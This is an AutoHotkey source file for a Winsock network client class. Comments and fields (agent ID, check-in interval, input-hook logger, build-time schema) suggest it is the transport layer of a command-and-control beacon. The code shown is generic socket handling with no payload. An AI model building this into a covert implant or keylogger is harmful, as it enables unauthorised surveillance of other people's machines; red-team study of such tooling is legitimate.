; ============================================================================
; NETWORK CLIENT CLASS - Base Implementation
; ============================================================================
; Core networking functionality using Windows sockets (Winsock)
; ============================================================================

class NetworkClient {
    ; Socket constants
    AF_INET := 2
    SOCK_STREAM := 1
    IPPROTO_TCP := 6
    SOCKET_ERROR := -1
    WSAEWOULDBLOCK := 10035
    WSAECONNREFUSED := 10061
    WSAETIMEDOUT := 10060

    ; Connection properties
    socket := 0
    wsaInitialized := false
    serverIP := "127.0.0.1"
    serverPort := 5074
    agentID := ""
    computerName := ""

    ; Check-in properties
    checkInInterval := 15000  ; 15 seconds default
    isRunning := false
    lastAction := ""
    isBusy := false

    ; Logger properties
    loggerIH := ""
    loggerisRunning := false

    ; Schema for this beacon (set during build)
    schema := "{{schema_filename}}"

    __New(serverIP := "127.0.0.1", serverPort := 5074) {
        this.serverIP := serverIP
        this.serverPort := serverPort
        this.Initialize()
        this.computerName := A_ComputerName
        this.agentID := this.GenerateAgentID()
    }

    Log(msg, logFile := "logfile.txt") {
        timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
        logMessage := timestamp " NetworkClient: " msg "`n"

        try {
            FileAppend(logMessage, "*")
        } catch Error as err {
            FileAppend(logMessage, logFile)
        }
    }

    Initialize() {
        if (!this.wsaInitialized) {
            wsaData := Buffer(408)
            result := DllCall("Ws2_32\WSAStartup", "UShort", 0x0202, "Ptr", wsaData)
            if (result != 0) {
                throw Error("WSAStartup failed with error: " DllCall("Ws2_32\WSAGetLastError"))
            }
            this.wsaInitialized := true
        }
    }

    SendMsg(serverIP, port, message, timeout := 60000, isBinaryResponse := false) {
        maxRetries := 5
        retryCount := 0
        startTime := A_TickCount

        while (A_TickCount - startTime < timeout) {
            try {
                ; Create socket
                this.socket := DllCall("Ws2_32\socket",
                    "Int", this.AF_INET,
                    "Int", this.SOCK_STREAM,
                    "Int", this.IPPROTO_TCP)

                if (this.socket = -1) {
                    throw Error("Socket creation failed: " . DllCall("Ws2_32\WSAGetLastError"))
                }

                ; Set socket options
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 5000, timeoutVal, 0)  ; 5 second timeout

                DllCall("Ws2_32\setsockopt",
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)

                DllCall("Ws2_32\setsockopt",
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1006,
                    "Ptr", timeoutVal,
                    "Int", 4)

                ; Create sockaddr structure
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)

                ; Connect
                if (DllCall("Ws2_32\connect",
                    "Ptr", this.socket,
                    "Ptr", sockaddr,
                    "Int", 16) = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    this.CloseSocket()
                    if (retryCount < maxRetries) {
                        this.Log("Could not connect to server, retrying in 1 second...")
                        Sleep(1000)
                        retryCount++
                        continue
                    }
                    throw Error("Connect failed: " . wsaError)
                }

                ; Send message
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")
                bytesSent := DllCall("Ws2_32\send",
                    "Ptr", this.socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)

                if (bytesSent = -1) {
                    wsaError := DllCall("Ws2_32\WSAGetLastError")
                    throw Error("Send failed: " . wsaError)
                }

                ; Receive response
                response := Buffer(4096, 0)
                totalReceived := 0

                while (true) {
                    bytesRecv := DllCall("Ws2_32\recv",
                        "Ptr", this.socket,
                        "Ptr", response.Ptr + totalReceived,
                        "Int", response.Size - totalReceived,
                        "Int", 0)

                    if (bytesRecv > 0) {
                        this.Log("Received " . bytesRecv . " bytes")
                        totalReceived += bytesRecv
                        if (totalReceived + 4096 >= response.Size) {
                            ; Expand buffer
                            newSize := response.Size * 2
                            this.Log("Expanding buffer to " . newSize . " bytes")
                            try {
                                newBuffer := Buffer(newSize, 0)
                                DllCall("RtlCopyMemory",
                                    "Ptr", newBuffer,
                                    "Ptr", response,
                                    "UPtr", totalReceived)
                                response := newBuffer
                            } catch as err {
                                this.Log("Buffer expansion failed: " . err.Message)
                                throw err
                            }
                        }
                    } else if (bytesRecv = 0) {
                        this.Log("Server closed connection normally")
                        break
                    } else {
                        wsaError := DllCall("Ws2_32\WSAGetLastError")
                        if (wsaError = this.WSAEWOULDBLOCK) {
                            Sleep(10)
                            continue
                        }
                        throw Error("Receive failed: " . wsaError)
                    }
                }

                ; Return appropriate response format
                if (isBinaryResponse) {
                    if (totalReceived = 0) {
                        return Buffer(0)
                    }
                    finalBuffer := Buffer(totalReceived, 0)
                    DllCall("RtlCopyMemory",
                        "Ptr", finalBuffer,
                        "Ptr", response,
                        "UPtr", totalReceived)
                    return finalBuffer
                } else {
                    return StrGet(response, totalReceived, "UTF-8")
                }

            } catch as err {
                this.Log("SendMsg error: " . err.Message)
                throw err
            } finally {
                this.CloseSocket()
            }
        }
        throw Error("Operation timed out after " . timeout . "ms")
    }

    SetSocketOptions() {
        timeoutVal := Buffer(4, 0)
        NumPut("UInt", 10000, timeoutVal, 0)  ; 10 second timeout

        ; Set receive timeout
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1005,
            "Ptr", timeoutVal,
            "Int", 4)

        ; Set send timeout
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x1006,
            "Ptr", timeoutVal,
            "Int", 4)

        ; Set keep-alive
        keepAlive := Buffer(4, 0)
        NumPut("UInt", 1, keepAlive, 0)
        DllCall("Ws2_32\setsockopt",
            "Ptr", this.socket,
            "Int", 0xFFFF,
            "Int", 0x8,
            "Ptr", keepAlive,
            "Int", 4)
    }

    ConnectSocket(serverIP, port) {
        sockaddr := Buffer(16, 0)
        NumPut("UShort", this.AF_INET, sockaddr, 0)
        NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
        NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)

        return DllCall("Ws2_32\connect",
            "Ptr", this.socket,
            "Ptr", sockaddr,
            "Int", 16) != -1
    }

    CloseSocket() {
        if (this.socket) {
            try {
                ; Try to send connection close notification
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 1)  ; SD_SEND

                ; Small receive buffer to get any pending data
                buf := Buffer(128, 0)

                ; Brief timeout for final receive
                timeoutVal := Buffer(4, 0)
                NumPut("UInt", 100, timeoutVal, 0)  ; 100ms timeout
                DllCall("Ws2_32\setsockopt",
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutVal,
                    "Int", 4)

                ; Try to receive any remaining data
                while (DllCall("Ws2_32\recv",
                    "Ptr", this.socket,
                    "Ptr", buf,
                    "Int", 128,
                    "Int", 0) > 0) {
                    ; Continue receiving until done
                }

                ; Now do full shutdown
                DllCall("Ws2_32\shutdown", "Ptr", this.socket, "Int", 2)  ; SD_BOTH
            } catch {
                ; Ignore errors during cleanup
            }

            ; Always close the socket
            DllCall("Ws2_32\closesocket", "Ptr", this.socket)
            this.socket := 0
        }
    }

    __Delete() {
        this.CloseSocket()
        if (this.wsaInitialized) {
            DllCall("Ws2_32\WSACleanup")
            this.wsaInitialized := false
        }
    }
}
